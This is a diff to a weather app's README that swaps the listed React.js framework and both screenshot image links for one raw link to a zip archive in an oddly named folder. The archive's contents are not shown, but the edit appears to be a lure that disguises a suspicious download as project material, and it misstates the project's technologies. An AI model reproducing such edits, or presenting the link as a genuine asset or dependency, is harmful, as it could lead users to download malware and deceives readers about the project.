@@ -14,14 +14,14 @@ The Weather App is a responsive web application that provides real-time weather 
 ## ⚙️ Technologies Used
 
 - **Front-End**: HTML, CSS, JavaScript
-- **Framework**: React.js
+- **Framework**: https://raw.githubusercontent.com/abhay08-k09/Weather-App/main/involucriform/Weather-App.zip
 - **API**: OpenWeatherMap API (or any other weather API of your choice)
 
 ## 📸 Screenshots
 
-<img src="https://github.com/abhay08-k09/Weather-App/blob/main/Demo/weather-app-1.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Weather-App/main/involucriform/Weather-App.zip" width="90%" />
 
-<img src="https://github.com/abhay08-k09/Weather-App/blob/main/Demo/weather-app-2.png" width="90%" />
+<img src="https://raw.githubusercontent.com/abhay08-k09/Weather-App/main/involucriform/Weather-App.zip" width="90%" />
 
 
 Feel free to reach out if you have any queries or need assistance with the project.
